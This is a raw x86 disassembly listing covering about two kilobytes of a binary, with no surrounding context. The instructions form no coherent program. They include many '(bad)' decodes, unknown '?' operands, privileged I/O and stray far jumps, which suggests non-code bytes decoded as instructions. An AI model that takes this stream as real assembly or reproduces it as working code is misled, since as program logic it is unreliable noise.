  423377:	shr    al,1
  423379:	outs   dx,DWORD PTR ds:[esi]
  42337a:	inc    esi
  42337b:	and    BYTE PTR [esi],0x10
  42337e:	enter  0x9910,0xd9
  423382:	aaa    
  423383:	push   0x5e
  423385:	cmp    DWORD PTR [ecx-0x518dccc4],edi
  42338b:	test   al,0xc3
  42338d:	pop    edi
  42338e:	or     BYTE PTR [edi],cl
  423390:	xchg   ecx,eax
  423391:	icebp  
  423392:	mov    eax,ds:0xbf442fa1
  423397:	aam    0xd0
  423399:	push   0x50
  42339b:	leave  
  42339c:	pop    eax
  42339d:	into   
  42339e:	imul   edi,ebp,0xffffff92
  4233a1:	xor    BYTE PTR [ecx+0x40],cl
  4233a4:	xchg   ebp,eax
  4233a5:	add    al,0xea
  4233a7:	dec    ebp
  4233a8:	in     eax,dx
  4233a9:	adc    al,0xc5
  4233ab:	lock cmp DWORD PTR [ecx-0x670af7d1],ebx
  4233b2:	gs push eax
  4233b4:	xor    dl,BYTE PTR [edx+0x6acdd5dd]
  4233ba:	ja     0x423367
  4233bc:	imul   esp,DWORD PTR [esp+ebp*4],0x48
  4233c0:	mov    al,0x64
  4233c2:	fdivp  st(1),st
  4233c4:	out    dx,al
  4233c5:	sbb    DWORD PTR [ecx-0x3aa126d7],edi
  4233cb:	push   eax
  4233cc:	pop    es
  4233cd:	je     0x4233d3
  4233cf:	imul   BYTE PTR gs:[ecx-0x295ae7da]
  4233d6:	xor    BYTE PTR [eax+0x4f],ah
  4233d9:	jnp    0x423409
  4233db:	out    0x9d,al
  4233dd:	arpl   WORD PTR [eax+0x452ac5e8],ax
  4233e3:	dec    ecx
  4233e4:	stos   BYTE PTR es:[edi],al
  4233e5:	icebp  
  4233e6:	das    
  4233e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233e8:	inc    esi
  4233e9:	mov    ds:0x60879055,al
  4233ee:	stos   BYTE PTR es:[edi],al
  4233ef:	popa   
  4233f0:	xor    DWORD PTR [edx+0x64],ecx
  4233f3:	push   0x59
  4233f5:	sub    edx,DWORD PTR [ebx+0x60465584]
  4233fb:	jle    0x423426
  4233fd:	leave  
  4233fe:	ds daa 
  423400:	xor    DWORD PTR ds:0xeca84cd2,esp
  423406:	adc    ah,dh
  423408:	div    esp
  42340a:	jecxz  0x423432
  42340c:	cld    
  42340d:	rol    DWORD PTR [esi+0x1bcd2625],0x7e
  423414:	pop    eax
  423415:	outs   dx,DWORD PTR ds:[esi]
  423416:	in     eax,dx
  423417:	jne    0x42347b
  423419:	mov    eax,?
  42341b:	stos   BYTE PTR es:[edi],al
  42341c:	je     0x423426
  42341e:	sbb    edi,DWORD PTR [ebp-0x1fddf85a]
  423424:	xchg   ebx,eax
  423425:	xchg   ebp,eax
  423426:	jnp    0x42347a
  423428:	cli    
  423429:	dec    ebp
  42342a:	dec    edi
  42342b:	mov    ch,0xb3
  42342d:	add    al,BYTE PTR [esi-0x78b10205]
  423433:	push   edx
  423434:	sahf   
  423435:	std    
  423436:	push   ebp
  423437:	push   ebx
  423438:	adc    bh,BYTE PTR [ebp+0x42f6b5f8]
  42343e:	xor    BYTE PTR [eax+0xa],bl
  423441:	sbb    ebx,DWORD PTR [ecx]
  423443:	mov    eax,0x960ef236
  423448:	mov    WORD PTR ds:0x91bab497,?
  42344e:	push   ss
  42344f:	imul   edx,DWORD PTR [edx],0x12bc59fb
  423455:	shl    DWORD PTR [eax],1
  423457:	data16 hlt 
  423459:	sbb    al,0xc1
  42345b:	sbb    ah,BYTE PTR [ecx]
  42345d:	push   ecx
  42345e:	jmp    0x9942:0xcb3195f
  423465:	mov    ?,edx
  423467:	shl    BYTE PTR [edx+ebx*1-0x21e9e6d8],1
  42346e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42346f:	fcom   DWORD PTR [edi]
  423471:	repz mov ds:0x8df1cd1,eax
  423477:	jmp    0x104f:0x5841db90
  42347e:	test   al,0x28
  423480:	xchg   ebp,eax
  423481:	pop    edi
  423482:	cwde   
  423483:	or     BYTE PTR [ecx-0x68],cl
  423486:	cmp    eax,0xd81de106
  42348b:	(bad)  
  42348c:	xor    BYTE PTR [ebp-0x23],ah
  42348f:	xor    dh,BYTE PTR [eax+0x33]
  423492:	ret    
  423493:	pop    ss
  423494:	sub    eax,0xe1ec9a8c
  423499:	mov    ds:0x6ba3f54c,eax
  42349e:	sbb    al,0x3c
  4234a0:	bound  ebp,QWORD PTR [ecx+eax*4+0xc114676]
  4234a7:	sub    BYTE PTR ds:0x717bbf6e,dh
  4234ad:	and    BYTE PTR [edi+0x3b],0x96
  4234b1:	lods   al,BYTE PTR cs:[esi]
  4234b3:	or     bl,bl
  4234b5:	rcr    BYTE PTR ds:0xc5d345f8,1
  4234bb:	cmc    
  4234bc:	dec    ebx
  4234bd:	lds    eax,FWORD PTR ds:0xcc3fc5b1
  4234c3:	iret   
  4234c4:	fistp  DWORD PTR [edi+0x21affb81]
  4234ca:	jmp    0x4234f8
  4234cc:	sbb    BYTE PTR [edi-0x3d],0x95
  4234d0:	mov    ds:0x5f15bdb2,al
  4234d5:	stos   BYTE PTR es:[edi],al
  4234d6:	and    eax,0xd05e041d
  4234db:	add    eax,0xa01942ea
  4234e0:	int    0x7
  4234e2:	pop    ds
  4234e3:	ret    
  4234e4:	pusha  
  4234e5:	retf   
  4234e6:	pop    ds
  4234e7:	imul   ecx,DWORD PTR [ecx-0xfe77b0b],0x575e8144
  4234f1:	jmp    0x4234f9
  4234f3:	and    BYTE PTR [edx+0x2d],ch
  4234f6:	aas    
  4234f7:	fsubr  st,st(6)
  4234f9:	and    ah,BYTE PTR [esi+0x5b]
  4234fc:	push   edi
  4234fd:	sti    
  4234fe:	je     0x4234ca
  423500:	sbb    DWORD PTR [esi-0x7d9376a7],esi
  423506:	bnd jg 0x423497
  423509:	out    dx,al
  42350a:	clc    
  42350b:	(bad)  
  42350c:	out    dx,eax
  42350d:	das    
  42350e:	popf   
  42350f:	ds add edx,0x8de515c8
  423516:	lock jmp 0xa915:0xe114209b
  42351e:	sbb    dh,BYTE PTR [edi+0x368b1eaf]
  423524:	jb     0x42355b
  423526:	mov    ebx,0xf4bd507
  42352b:	lods   al,BYTE PTR ds:[esi]
  42352c:	out    dx,al
  42352d:	repnz push ebp
  42352f:	call   0xe0a7d6b6
  423534:	jge    0x423544
  423536:	push   ebp
  423537:	push   cs
  423538:	and    edx,DWORD PTR [ebp+0x502ea0e8]
  42353e:	(bad)  
  42353f:	daa    
  423540:	mov    ds:0xb81a2cb3,al
  423545:	mov    edx,ds
  423547:	mov    ds:0x38cd3a07,al
  42354c:	out    dx,eax
  42354d:	or     al,0x6c
  42354f:	xor    BYTE PTR [eax],bh
  423551:	dec    ebp
  423552:	retf   0x896a
  423555:	outs   dx,DWORD PTR ds:[esi]
  423556:	push   esi
  423557:	test   al,0x4e
  423559:	sahf   
  42355a:	das    
  42355b:	mov    edx,0x36f06df2
  423560:	stos   BYTE PTR es:[edi],al
  423561:	mov    ebp,0x9289da36
  423566:	sub    BYTE PTR [esp+edi*8],0x9
  42356a:	xor    dh,BYTE PTR [edi]
  42356c:	push   ds
  42356d:	push   ss
  42356e:	mov    BYTE PTR [ebx-0x7baa8c33],dl
  423574:	adc    DWORD PTR [ecx-0x288ded77],0x9ce099d2
  42357e:	mov    ds:0x6a86fb36,eax
  423583:	sti    
  423584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423585:	outs   dx,BYTE PTR ds:[esi]
  423586:	rcl    BYTE PTR [ebp+0x22],0x37
  42358a:	into   
  42358b:	mov    cl,0xc0
  42358d:	test   al,0x56
  423590:	mov    edi,0x67e13d4
  423595:	adc    DWORD PTR [ebx],esi
  423597:	and    DWORD PTR [ebp-0x21c833dd],esp
  42359d:	sti    
  42359e:	jg     0x423526
  4235a0:	adc    DWORD PTR [ebx+0x5fd31163],edx
  4235a6:	pop    eax
  4235a7:	(bad)  
  4235a8:	or     bh,BYTE PTR [esi+ecx*8-0x3baf0c1f]
  4235af:	push   ecx
  4235b0:	jl     0x4235b0
  4235b2:	test   al,0xaa
  4235b4:	mov    ?,edx
  4235b6:	sub    edx,ebp
  4235b8:	inc    edi
  4235b9:	xchg   edi,eax
  4235ba:	sbb    DWORD PTR [eax-0x2a],esi
  4235bd:	loopne 0x423546
  4235bf:	jns    0x4235ad
  4235c1:	clc    
  4235c2:	dec    ebp
  4235c3:	out    0x48,al
  4235c5:	cmp    eax,0x939c402a
  4235ca:	or     BYTE PTR [ebx+0xe],bl
  4235cd:	mov    dh,0x30
  4235cf:	jbe    0x42357a
  4235d1:	and    ch,dl
  4235d3:	rcr    BYTE PTR [eax+ebx*1],0x3b
  4235d7:	addr16 sti 
  4235d9:	mov    dl,0x98
  4235db:	fwait
  4235dc:	pushf  
  4235dd:	dec    esi
  4235de:	xchg   edi,eax
  4235df:	add    DWORD PTR [esi],edi
  4235e1:	cmp    al,0xdb
  4235e3:	adc    eax,DWORD PTR [edx+0x5ff70c09]
  4235e9:	and    al,0x49
  4235eb:	dec    esp
  4235ec:	pusha  
  4235ed:	xor    DWORD PTR [ecx+0x1420ed02],esi
  4235f3:	jmp    0x4235a5
  4235f5:	sbb    BYTE PTR [ebx+0x5],al
  4235f8:	sbb    BYTE PTR [edi-0x35],bl
  4235fb:	popf   
  4235fc:	xchg   ecx,eax
  4235fd:	cmp    edx,DWORD PTR [ebx+0x68]
  423600:	and    DWORD PTR [edx],eax
  423602:	outs   dx,BYTE PTR ds:[esi]
  423603:	jo     0x4235e4
  423605:	pusha  
  423606:	loope  0x42367c
  423608:	daa    
  423609:	xchg   edi,eax
  42360a:	push   esp
  42360b:	arpl   WORD PTR [esi-0x751e9818],di
  423611:	sub    al,0x35
  423613:	push   ds
  423614:	dec    ebx
  423615:	pop    esp
  423616:	pop    ecx
  423617:	and    ecx,DWORD PTR [edx-0x61]
  42361a:	repnz shl DWORD PTR [eiz*8+0x6e720e02],0x18
  423623:	mov    edi,0x6dc9560a
  423628:	sar    ebx,0xba
  42362b:	call   0x9411:0x994e8de
  423632:	scas   eax,DWORD PTR es:[edi]
  423633:	jg     0x4235f0
  423635:	and    BYTE PTR [ebp+0x59],0x8d
  423639:	xchg   esp,eax
  42363a:	test   eax,0x85040c44
  42363f:	and    al,0x28
  423641:	test   eax,0xc332434e
  423646:	xor    DWORD PTR [eax+0x55],edx
  423649:	(bad)  
  42364c:	icebp  
  42364d:	pop    ds
  42364e:	pop    eax
  42364f:	stos   DWORD PTR es:[edi],eax
  423650:	test   al,0xa4
  423652:	dec    edi
  423653:	jl     0x4236bb
  423655:	jg     0x42367b
  423657:	nop
  423658:	sti    
  423659:	xchg   BYTE PTR [ecx],cl
  42365b:	pusha  
  42365c:	loopne 0x42364f
  42365e:	adc    BYTE PTR [ebx],dl
  423660:	je     0x4236a8
  423662:	dec    edx
  423663:	dec    cl
  423665:	push   cs
  423666:	mov    ah,0x6c
  423668:	cmp    ebx,DWORD PTR [esi+0x5443bfbe]
  42366e:	jmp    0xc8e65753
  423673:	out    dx,eax
  423674:	inc    ebx
  423675:	sub    al,bl
  423677:	add    bl,BYTE PTR [ebp+0x20]
  42367a:	sub    ebp,DWORD PTR [esp+eiz*4]
  42367d:	mov    dh,0x24
  42367f:	ins    DWORD PTR es:[edi],dx
  423680:	das    
  423681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423682:	mov    al,ds:0xb4313ea9
  423687:	mov    esp,0x5ded4d1b
  42368c:	mov    eax,0xbb1a0868
  423691:	je     0x423692
  423693:	or     BYTE PTR [ecx*1-0x4b001fcb],0xef
  42369b:	inc    edx
  42369c:	add    eax,0xd4f053c1
  4236a1:	cs aaa 
  4236a3:	test   DWORD PTR [edx],esi
  4236a5:	bound  eax,QWORD PTR [ebx]
  4236a7:	cmc    
  4236a8:	fmul   QWORD PTR [ecx+0x61]
  4236ab:	xor    DWORD PTR [eax+0x69003d2b],edi
  4236b1:	mov    dl,0xb5
  4236b3:	xor    ebp,DWORD PTR [ecx]
  4236b5:	jae    0x423712
  4236b7:	sbb    ebp,DWORD PTR [esi-0x1d030f5]
  4236bd:	xor    dh,BYTE PTR [ebx-0x7a]
  4236c0:	jge    0x4236a9
  4236c2:	sbb    al,0xbf
  4236c4:	imul   edx,DWORD PTR [esi+0x3a719fc9],0x7da3cb9d
  4236ce:	mov    eax,ds:0x2b2d1d2f
  4236d3:	stc    
  4236d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236d5:	sub    al,0x5d
  4236d7:	mov    dl,0x98
  4236d9:	pop    ebp
  4236da:	clc    
  4236db:	neg    DWORD PTR [ebx-0x3c691fee]
  4236e1:	js     0x42375f
  4236e3:	sub    BYTE PTR [ebp+edi*4-0x5],cl
  4236e7:	mov    al,ds:0xe3b2f92
  4236ec:	or     BYTE PTR [esi],0x79
  4236ef:	pushf  
  4236f0:	mov    edi,0xf952825b
  4236f5:	mov    edx,0x952caff3
  4236fa:	in     eax,dx
  4236fb:	xor    dh,al
  4236fd:	outs   dx,BYTE PTR ds:[esi]
  4236fe:	rol    DWORD PTR [esi+0x52],0x3f
  423702:	or     eax,0x95e586d2
  423707:	pop    edx
  423708:	or     eax,0x6ef50b54
  42370d:	mov    cl,0x73
  42370f:	sub    esp,0xffffffda
  423712:	sub    dh,BYTE PTR [ebx]
  423714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423715:	ss or  al,0xb5
  423718:	xchg   ebx,eax
  423719:	popf   
  42371a:	pushf  
  42371b:	and    ah,bl
  42371d:	or     DWORD PTR [ebp-0x32],esi
  423720:	push   edx
  423721:	std    
  423722:	mov    esi,0x8a1fcd1b
  423727:	icebp  
  423728:	mov    eax,0x316e088
  42372d:	lahf   
  42372e:	aad    0xfc
  423730:	and    DWORD PTR [esi-0x298b8c15],ebp
  423736:	clc    
  423737:	int3   
  423738:	push   eax
  423739:	scas   al,BYTE PTR es:[edi]
  42373a:	inc    ecx
  42373b:	xor    ebp,DWORD PTR ds:0xce068c25
  423741:	mov    BYTE PTR [esi],al
  423743:	mov    bl,0x13
  423745:	adc    ebp,esi
  423747:	dec    edx
  423748:	test   BYTE PTR [edx+0x57d2f227],0xf3
  42374f:	jg     0x42373c
  423751:	adc    dh,BYTE PTR [eax-0x7a054c34]
  423757:	lds    eax,FWORD PTR [ebx-0x24]
  42375a:	cmp    al,cl
  42375c:	out    dx,eax
  42375d:	scas   al,BYTE PTR es:[edi]
  42375e:	pop    ebp
  42375f:	mov    ebp,0xcacce124
  423764:	adc    al,0x29
  423766:	fyl2xp1 
  423768:	aad    0xb6
  42376a:	or     bh,BYTE PTR [edi+0x5074bdcb]
  423770:	stos   DWORD PTR es:[edi],eax
  423771:	cmp    esi,ebx
  423773:	sbb    ebp,DWORD PTR [eax+ebp*1+0x2639111e]
  42377a:	out    0x54,al
  42377c:	cmp    ch,BYTE PTR [edx]
  42377e:	fisttp WORD PTR [edx-0x27dabe9a]
  423784:	xchg   ebp,eax
  423785:	repz pop ebx
  423787:	mov    dh,0xeb
  423789:	out    0xc8,eax
  42378b:	jg     0x4237db
  42378d:	xor    eax,0x2a0a36ea
  423792:	jns    0x42377c
  423794:	jle    0x423738
  423796:	inc    esi
  423797:	cmp    esi,ebp
  423799:	test   ebp,edi
  42379b:	out    0x4c,eax
  42379d:	mov    dh,BYTE PTR [esi-0x45]
  4237a0:	mov    ecx,DWORD PTR [ebp-0x18b2dd1c]
  4237a6:	int    0x28
  4237a8:	push   esp
  4237a9:	(bad)  [ebp-0x42]
  4237ac:	and    al,0xc9
  4237ae:	mov    edi,0x52e7be11
  4237b3:	repnz aam 0xa7
  4237b6:	arpl   WORD PTR [eax],bp
  4237b8:	jo     0x423783
  4237ba:	ds xchg ebp,eax
  4237bc:	push   esi
  4237bd:	mov    cl,0x4a
  4237bf:	jl     0x42377e
  4237c1:	je     0x42378a
  4237c3:	dec    esi
  4237c4:	cmp    edi,ecx
  4237c6:	idiv   edx
  4237c8:	sbb    al,0xd3
  4237ca:	xchg   BYTE PTR [ecx-0x3e79727],al
  4237d0:	std    
  4237d1:	outs   dx,DWORD PTR ds:[esi]
  4237d2:	sahf   
  4237d3:	sub    eax,0x7408a193
  4237d8:	pop    ss
  4237d9:	or     al,0x16
  4237dc:	xchg   ecx,eax
  4237dd:	jne    0x42381d
  4237df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237e0:	neg    ch
  4237e2:	lds    edx,FWORD PTR [edx-0x5bf1b6c3]
  4237e8:	cmp    DWORD PTR [eax],0x2a5f365e
  4237ee:	loop   0x4237e6
  4237f0:	in     eax,dx
  4237f1:	jbe    0x42377a
  4237f3:	sbb    al,0xe7
  4237f5:	adc    BYTE PTR [eax+0x6f],0xbf
  4237f9:	jnp    0x4237a8
  4237fb:	cld    
  4237fc:	cwde   
  4237fd:	push   esi
  4237fe:	imul   eax,DWORD PTR [edi],0x50
  423801:	push   cs
  423802:	call   0x71217bba
  423807:	add    al,0x42
  423809:	add    BYTE PTR [ecx-0x2e9e589f],cl
  42380f:	ret    
  423810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423811:	xchg   esi,eax
  423812:	sbb    al,0x47
  423814:	dec    ecx
  423815:	xor    DWORD PTR [ebp-0x22],esi
  423818:	adc    DWORD PTR [edx],eax
  42381a:	dec    ebp
  42381b:	cdq    
  42381c:	push   0x48333e53
  423821:	das    
  423822:	or     eax,0xde6fa3cf
  423827:	test   al,0x93
  423829:	stc    
  42382a:	and    ch,BYTE PTR ds:0x3147d310
  423830:	inc    eax
  423831:	mov    ch,0x13
  423833:	lods   eax,DWORD PTR ds:[esi]
  423834:	adc    DWORD PTR [edx],esp
  423836:	or     ah,BYTE PTR [edi+esi*8+0x6d719a26]
  42383d:	je     0x42386b
  42383f:	popa   
  423840:	mov    dl,0xc7
  423842:	pop    esi
  423843:	ficomp DWORD PTR [edx+0x25]
  423846:	ins    BYTE PTR es:[edi],dx
  423847:	cmp    dh,cl
  423849:	xor    DWORD PTR [edi+0x47],0xffffffd3
  42384d:	dec    esp
  42384e:	dec    eax
  42384f:	je     0x42382a
  423851:	ins    BYTE PTR es:[edi],dx
  423852:	add    DWORD PTR [ecx-0x714bc237],esp
  423858:	in     al,dx
  423859:	dec    ebp
  42385a:	mov    cl,0x34
  42385c:	ror    DWORD PTR [esi+0x8193773],1
  423862:	dec    esp
  423863:	dec    edi
  423864:	fnstcw WORD PTR [ebx+0x7a79e78d]
  42386a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42386b:	pop    ebx
  42386c:	xor    eax,0xc62cf7d9
  423871:	xchg   ebp,eax
  423872:	sub    eax,DWORD PTR [edx]
  423874:	add    eax,0x64c971e1
  423879:	fnstsw WORD PTR [eax]
  42387b:	xchg   ebx,eax
  42387c:	ss mov edx,0xa032540f
  423882:	add    cl,BYTE PTR [ebx-0x5b]
  423885:	xchg   edi,eax
  423886:	fnsave [eax]
  423888:	sbb    ecx,ebx
  42388a:	mov    bh,0x8
  42388c:	stc    
  42388d:	sbb    esi,DWORD PTR [eax]
  42388f:	cmp    al,0x40
  423891:	jp     0x4238f6
  423893:	add    eax,0x7d3b64f
  423898:	inc    eax
  423899:	int3   
  42389a:	pop    ss
  42389b:	cmp    BYTE PTR [ecx-0x69],ah
  42389e:	or     al,0xce
  4238a0:	push   ss
  4238a1:	mov    ebx,0x144a333d
  4238a6:	in     eax,0x1a
  4238a8:	in     al,dx
  4238a9:	or     ebp,ecx
  4238ab:	jmp    0x659249bb
  4238b0:	lds    ecx,FWORD PTR [ecx+0x6d7a7f2d]
  4238b6:	jp     0x4238cd
  4238b8:	ror    BYTE PTR [eax],0xad
  4238bb:	xchg   edx,eax
  4238bc:	lds    esp,FWORD PTR [ebp+edx*1+0x79]
  4238c0:	popa   
  4238c1:	jbe    0x4238e3
  4238c3:	imul   ch
  4238c5:	pop    ss
  4238c6:	inc    ecx
  4238c7:	xor    eax,0x4880d626
  4238cc:	push   cs
  4238cd:	out    dx,eax
  4238ce:	dec    ecx
  4238cf:	mov    bh,0x5d
  4238d1:	jge    0x42394e
  4238d3:	fwait
  4238d4:	out    0xa4,eax
  4238d6:	cli    
  4238d7:	xchg   edi,eax
  4238d8:	xlat   BYTE PTR ds:[ebx]
  4238d9:	clc    
  4238da:	sbb    BYTE PTR [ebx+ebp*1+0x5a3acfe1],dh
  4238e1:	(bad)  
  4238e2:	call   0x5f62:0xf2619654
  4238e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238ea:	push   ebx
  4238eb:	mov    ds:0x7c0c5928,al
  4238f1:	cmp    al,0x3f
  4238f3:	pop    ss
  4238f4:	nop
  4238f5:	dec    eax
  4238f6:	sbb    eax,DWORD PTR [ecx-0x6862dd30]
  4238fc:	jp     0x42391e
  4238fe:	dec    ebp
  4238ff:	in     eax,0x90
  423901:	mov    esi,0x4ffde02b
  423906:	xor    BYTE PTR [esi+edx*4-0x79],ch
  42390a:	or     al,0xd4
  42390c:	push   esp
  42390d:	lock jg 0x4238ae
  423910:	pop    eax
  423911:	sbb    al,0xf2
  423913:	rcr    BYTE PTR [edx+eiz*8],0xd8
  423917:	jne    0x42393a
  423919:	mov    cl,0x8f
  42391b:	push   ebp
  42391c:	mov    ebx,0x65d71b4
  423921:	lods   eax,DWORD PTR ds:[esi]
  423922:	adc    edx,ecx
  423924:	std    
  423925:	adc    BYTE PTR [esi+esi*8-0x46270e5a],bh
  42392c:	cmp    al,0x29
  42392e:	scas   eax,DWORD PTR es:[edi]
  42392f:	loop   0x4238df
  423931:	xchg   esp,eax
  423932:	inc    edi
  423933:	inc    esi
  423934:	sbb    ecx,DWORD PTR [ebx]
  423936:	out    dx,eax
  423937:	ins    BYTE PTR es:[edi],dx
  423938:	mov    bh,0x82
  42393a:	push   ds
  42393b:	fcomp  st(2)
  42393d:	push   edi
  42393e:	mov    dl,0x4a
  423940:	mov    al,BYTE PTR [esi+0x44]
  423943:	add    bl,0xad
  423946:	dec    eax
  423947:	test   eax,0xecab441c
  42394c:	ja     0x423945
  42394e:	cld    
  42394f:	jmp    0x4ed9a9aa
  423954:	jle    0x423995
  423956:	aaa    
  423957:	mov    esi,0x5af17945
  42395c:	inc    edx
  42395d:	xchg   edi,eax
  42395e:	xchg   ebx,eax
  42395f:	inc    eax
  423960:	(bad)  
  423962:	lods   al,BYTE PTR ds:[esi]
  423963:	sub    edi,esp
  423965:	pop    esi
  423966:	push   edx
  423967:	add    DWORD PTR [edx+0x65],ecx
  42396a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42396b:	das    
  42396c:	test   eax,0xb089d5f0
  423971:	add    esp,ecx
  423973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423974:	rsqrtps xmm2,XMMWORD PTR ds:0xe93e6aa4
  42397b:	inc    esi
  42397c:	sub    al,BYTE PTR [ebx+0x7d]
  42397f:	sub    eax,0xcb9909b9
  423984:	adc    eax,0xdead03ea
  423989:	test   eax,0x2993cd77
  42398e:	lods   eax,DWORD PTR ds:[esi]
  42398f:	ins    BYTE PTR es:[edi],dx
  423990:	pusha  
  423991:	mov    ecx,0x3463149c
  423996:	div    esi
  423998:	cli    
  423999:	lock stos BYTE PTR es:[edi],al
  42399b:	cmp    dl,BYTE PTR ds:0x7d557dd4
  4239a1:	pop    ss
  4239a2:	clc    
  4239a3:	push   ecx
  4239a4:	cmp    DWORD PTR [ebp-0x24],esp
  4239a7:	scas   eax,DWORD PTR es:[edi]
  4239a8:	retf   
  4239a9:	sbb    edx,DWORD PTR [ecx+0x43]
  4239ac:	aam    0xbf
  4239ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239af:	dec    esp
  4239b0:	in     al,dx
  4239b1:	mov    ebx,0xd12eb9a6
  4239b6:	sub    eax,eax
  4239b8:	cs icebp 
  4239ba:	test   DWORD PTR [ebx-0x38fcc7b3],ebx
  4239c0:	pop    esp
  4239c1:	cdq    
  4239c2:	sub    al,0xfb
  4239c4:	jne    0x42395f
  4239c6:	out    dx,al
  4239c7:	xchg   ebx,eax
  4239c8:	mov    al,ds:0x9b851cff
  4239cd:	add    DWORD PTR [ebx-0x1e],0xffffffae
  4239d1:	and    DWORD PTR [esi-0x38],0x63
  4239d5:	in     al,0x7
  4239d7:	or     DWORD PTR [esi-0x25],edx
  4239da:	fmulp  st(6),st
  4239dc:	pop    edi
  4239dd:	push   ss
  4239de:	ret    
  4239df:	dec    edi
  4239e0:	rcr    ch,0x35
  4239e3:	and    BYTE PTR [esi+edi*4+0x2f],0xa6
  4239e8:	call   0x1d96:0x6134b755
  4239ef:	push   ebp
  4239f0:	push   ss
  4239f1:	push   ss
  4239f2:	popf   
  4239f3:	ds mov bl,0x20
  4239f6:	mov    esp,0x49be7db5
  4239fb:	cwde   
  4239fc:	ret    0x10ba
  4239ff:	sahf   
  423a00:	sti    
  423a01:	lods   al,BYTE PTR ds:[esi]
  423a02:	xchg   edi,eax
  423a03:	sbb    al,0xae
  423a05:	pop    esi
  423a06:	pop    es
  423a07:	std    
  423a08:	aas    
  423a09:	or     eax,0x5d68bc4
  423a0e:	jecxz  0x4239ee
  423a10:	inc    edx
  423a11:	mov    ?,ebp
  423a13:	sbb    esp,DWORD PTR [esi-0x383bace1]
  423a19:	push   cs
  423a1a:	mov    ch,0xb9
  423a1c:	or     DWORD PTR [esp],ebx
  423a1f:	jae    0x423a48
  423a21:	int3   
  423a22:	rcr    BYTE PTR [ebx-0x319c4a29],1
  423a28:	mov    ebx,DWORD PTR [ebx+0x77]
  423a2b:	sub    BYTE PTR [esi+0x4ce9dd9c],bh
  423a31:	data16 mov ah,0x9b
  423a34:	and    BYTE PTR [eax+edx*4+0x713ea43e],bh
  423a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a3c:	inc    edi
  423a3d:	ret    0xfe07
  423a40:	(bad)  
  423a42:	push   0xffffffdb
  423a44:	mov    ecx,0x199b3e72
  423a49:	vandnps xmm4,xmm0,XMMWORD PTR [ecx-0x76]
  423a4e:	or     al,0x19
  423a50:	and    ecx,DWORD PTR [edi-0x7a]
  423a53:	mov    eax,0x320445a1
  423a58:	jg     0x423a46
  423a5a:	ss jle 0x423a8d
  423a5d:	(bad)  
  423a5e:	sub    DWORD PTR [ebx-0x4abdebe8],esp
  423a64:	dec    esi
  423a65:	in     al,0xb8
  423a67:	mov    cl,0x7a
  423a69:	inc    ebp
  423a6a:	outs   dx,DWORD PTR ds:[esi]
  423a6b:	xchg   BYTE PTR [ebx-0x6681977],bh
  423a71:	lods   al,BYTE PTR ds:[esi]
  423a72:	jo     0x423ae7
  423a74:	add    al,0x7b
  423a76:	fnsave [eax+eax*2]
  423a79:	push   esi
  423a7a:	push   ecx
  423a7b:	and    BYTE PTR [edi-0x5b77bae8],dl
  423a81:	leave  
  423a82:	dec    eax
  423a83:	imul   eax,DWORD PTR [edi+edi*1],0x46
  423a87:	mov    eax,ds:0x252c91d
  423a8c:	in     eax,0xc4
  423a8e:	(bad)  
  423a8f:	dec    esi
  423a90:	xchg   ebx,eax
  423a91:	sub    BYTE PTR [edi+0x4dd80462],dl
  423a97:	icebp  
  423a98:	mov    ecx,0x1c8b4ed6
  423a9d:	pop    edi
  423a9e:	jmp    0x423a47
  423aa0:	xchg   edx,eax
  423aa1:	iret   
  423aa2:	sbb    ebp,esp
  423aa4:	cmp    al,0xd4
  423aa6:	mov    ebp,0xf9ee0982
  423aab:	inc    esi
  423aac:	and    al,0x50
  423aaf:	lea    eax,[eax-0x56c98e47]
  423ab5:	mov    dh,0xf1
  423ab7:	mov    edx,0x5dfc8fb1
  423abc:	sub    BYTE PTR [ebx],ah
  423abe:	inc    ebp
  423abf:	ins    DWORD PTR es:[edi],dx
  423ac0:	ret    0x65ff
  423ac3:	jbe    0x423af2
  423ac5:	loopne 0x423a98
  423ac7:	xchg   DWORD PTR [esi+eiz*8-0x4],ebp
  423acb:	addr16 pop edi
  423acd:	pushf  
  423ace:	add    DWORD PTR [edx+esi*8],0xffffffb4
  423ad2:	mov    ds,esi
  423ad4:	add    ah,bl
  423ad6:	in     al,0x7b
  423ad8:	rcr    BYTE PTR [edx-0x19],1
  423adb:	mov    cl,bh
  423add:	sub    eax,0xf55f6880
  423ae2:	lds    esi,FWORD PTR [esi+eax*8-0xd]
  423ae6:	xchg   ecx,eax
  423ae7:	sub    al,0x2f
  423ae9:	out    dx,eax
  423aea:	iret   
  423aeb:	push   ecx
  423aec:	xor    eax,0x30e8d803
  423af1:	pusha  
  423af2:	dec    ebp
  423af3:	jb     0x423a9a
  423af5:	pop    ss
  423af6:	outs   dx,DWORD PTR ds:[esi]
  423af7:	mov    eax,ds:0xc3fc8c11
  423afc:	dec    eax
  423afd:	mov    WORD PTR [esi-0x524644f0],cs
  423b03:	or     eax,0xe605977b
  423b08:	pop    es
  423b09:	arpl   WORD PTR [ebp+0x7],di
  423b0c:	and    eax,0x41283ec7
  423b11:	aas    
  423b12:	pop    esp
  423b13:	fsubp  st(5),st
  423b15:	xchg   BYTE PTR [esi+eax*4-0x77],bl
  423b19:	mov    eax,0x2d8c40a7
  423b1e:	sub    eax,0xb252280d
  423b23:	sub    al,0x21
  423b25:	mov    cl,0x3e
  423b27:	adc    cl,dl
  423b29:	stos   WORD PTR es:[edi],ax
  423b2b:	outs   dx,BYTE PTR ds:[esi]
  423b2c:	sub    eax,0xae66bb63
  423b31:	leave  
  423b32:	xchg   ebp,eax
  423b33:	jne    0x423b64
  423b35:	jmp    0xe404691a
  423b3a:	repz ret 0xed72
  423b3e:	dec    ebp
